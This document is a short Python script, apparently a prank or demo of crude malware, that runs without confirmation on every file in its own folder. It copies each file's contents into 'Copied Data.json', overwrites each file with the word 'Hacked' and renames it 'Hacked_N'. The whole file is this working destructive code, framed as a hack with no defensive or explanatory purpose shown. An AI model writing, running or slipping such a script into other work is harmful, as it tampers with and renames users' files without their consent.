import os
import json
import time

def copy_replace_and_rename():
    current_directory = os.path.dirname(os.path.abspath(__file__))
    
    data_dict = {}
    file_counter = 1
    
    for filename in os.listdir(current_directory):
        file_path = os.path.join(current_directory, filename)
        
        if os.path.isfile(file_path) and filename != os.path.basename(__file__):
            with open(file_path, 'r', encoding='utf-8') as file:
                data_dict[filename] = file.read()
            
            with open(file_path, 'w', encoding='utf-8') as file:
                file.write("Hacked")
            
            new_file_name = f"Hacked_{file_counter}"
            new_file_path = os.path.join(current_directory, new_file_name)
            os.rename(file_path, new_file_path)
            file_counter += 1
    json_file_path = os.path.join(current_directory, "Copied Data.json")
    with open(json_file_path, 'w', encoding='utf-8') as json_file:
        json.dump(data_dict, json_file, indent=4)
    
    return data_dict

if __name__ == "__main__":
    copied_data = copy_replace_and_rename()
    print("Hacked Data: ", copied_data)
    time.sleep(60)
